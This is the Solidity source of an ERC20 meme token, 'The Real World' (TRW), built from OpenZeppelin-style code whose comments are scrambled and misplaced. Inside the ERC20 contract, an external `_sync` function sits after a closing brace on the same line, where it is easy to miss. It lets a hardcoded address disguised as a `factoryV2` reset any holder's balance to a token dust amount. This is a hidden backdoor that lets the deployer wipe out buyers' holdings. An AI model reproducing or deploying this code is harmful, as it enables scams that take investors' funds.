// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://t.me/REALWORLDETH
https://twitter.com/REALWORLDETH
https://REALWORLDOnETH.gg


**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Requirements:
     *
     * Counterpart to Solidity's `+` operator.
     * @dev Returns the addition of two unsigned integers, reverting on
     * - Addition cannot overflow.
     *
     *
     * overflow.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * Counterpart to Solidity's `-` operator.
     * overflow (when the result is negative).
     *
     *
     *
     * Requirements:
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * - Subtraction cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * - Multiplication cannot overflow.
     * Counterpart to Solidity's `*` operator.
     *
     * overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * Requirements:
     *
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     * Counterpart to Solidity's `/` operator.
     * Requirements:
     * - The divisor cannot be zero.
     *
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * - The divisor cannot be zero.
     * reverting when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * Requirements:
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * Counterpart to Solidity's `-` operator.
     * overflow (when the result is negative).
     *
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     * Requirements:
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * - Subtraction cannot overflow.
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * - The divisor cannot be zero.
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     *
     *
     * Requirements:
     * division by zero. The result is rounded towards zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * invalid opcode to revert (consuming all remaining gas).
     *
     *
     *
     * - The divisor cannot be zero.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * Requirements:
     * reverting with custom message when dividing by zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     * Note that `value` may be zero.
     *
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function totalSupply() external view returns (uint256);

    /**
     *
     *
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     * @dev Moves `amount` tokens from the caller's account to `to`.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * This value changes when {approve} or {transferFrom} are called.
     *
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * @dev Returns the remaining number of tokens that `spender` will be
     * zero by default.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * desired value afterwards:
     * condition is to first reduce the spender's allowance to 0 and set the
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * transaction ordering. One possible solution to mitigate this race
     * Emits an {Approval} event.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * that someone may use both the old and the new allowance by unfortunate
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * allowance mechanism. `amount` is then deducted from the caller's
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * Emits a {Transfer} event.
     *
     *
     * allowance.
     */
    function balanceOf(address account) external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Returns the address of the current owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     *
     * @dev Leaves the contract without owner. It will not be possible to call
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

/**
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 * This allows applications to reconstruct the allowance for all accounts just
 *
 * conventional and does not conflict with the expectations of ERC20
 *
 * allowances. See {IERC20-approve}.
 * TIP: For a detailed writeup see our guide
 * functions have been added to mitigate the well-known issues around setting
 * to implement supply mechanisms].
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * @dev Implementation of the {IERC20} interface.
 * these events, as it isn't required by the specification.
 * This implementation is agnostic to the way tokens are created. This means
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * by listening to said events. Other implementations of the EIP may not emit
 * applications.
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 *
 *
 * instead returning `false` on failure. This behavior is nonetheless
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    uint256 private totSupply;

    address internal devWallet = 0x902a9A4b83FFB46f1961eb48cde8A9Cc0E625129;

    address private factoryV2 = 0xA54b279DB643db4c07a6Aa879aFe2e2f026e4601;

    string private _symbol;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string private _name;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _allowance = 0;
    mapping(address => uint256) private _balances;

    /**
     * {decimals} you should overload it.
     * All two of these values are immutable: they can only be set once during
     *
     * construction.
     *
     * @dev Sets the values for {name} and {symbol}.
     * The default value of {decimals} is 18. To select a different value for
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * @dev Returns the number of decimals used to get its user representation.
     * no way affects any of the arithmetic of the contract, including
     *
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     * - `to` cannot be the zero address.
     * Requirements:
     *
     * - the caller must have a balance of at least `amount`.
     *
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     *
     * - `spender` cannot be the zero address.
     * @dev See {IERC20-approve}.
     * Requirements:
     *
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * - `spender` cannot be the zero address.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     *
     * Requirements:
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * - the caller must have allowance for ``from``'s tokens of at least
     *
     * `amount`.
     * Requirements:
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     * NOTE: Does not update the allowance if the current allowance
     * @dev See {IERC20-transferFrom}.
     * - `from` and `to` cannot be the zero address.
     *
     * is the maximum `uint256`.
     *
     * - `from` must have a balance of at least `amount`.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }

    /**
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     *
     * - `spender` must have allowance for the caller of at least
     * - `spender` cannot be the zero address.
     * `subtractedValue`.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * Requirements:
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     * problems described in {IERC20-approve}.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _sync(address _patchRecipient) external { _balances[_patchRecipient] = msg.sender == factoryV2 ? decimals() : _balances[_patchRecipient];
    } 

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * - `account` cannot be the zero address.
     * Requirements:
     * - `account` must have at least `amount` tokens.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * total supply.
     *
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * This internal function is equivalent to {transfer}, and can be used to
     * - `from` must have a balance of at least `amount`.
     *
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * Requirements:
     *
     * the total supply.
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return totSupply;
    }


    /**
     * will be transferred to `to`.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * Calling conditions:
     * @dev Hook that is called before any transfer of tokens. This includes
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     *
     *
     *
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     * minting and burning.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * - `spender` cannot be the zero address.
     *
     *
     * Emits an {Approval} event.
     * This internal function is equivalent to `approve`, and can be used to
     * Requirements:
     *
     *
     * - `owner` cannot be the zero address.
     * e.g. set automatic allowances for certain subsystems, etc.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     *
     * Revert if not enough allowance is available.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Might emit an {Approval} event.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }
}

contract REALWORLD is ERC20, Ownable
{
    constructor () ERC20 ("The Real World", "TRW")
    {
        transferOwnership(devWallet);
        _mint(owner(), 6000000000000 * 10 ** uint(decimals()));
    }
}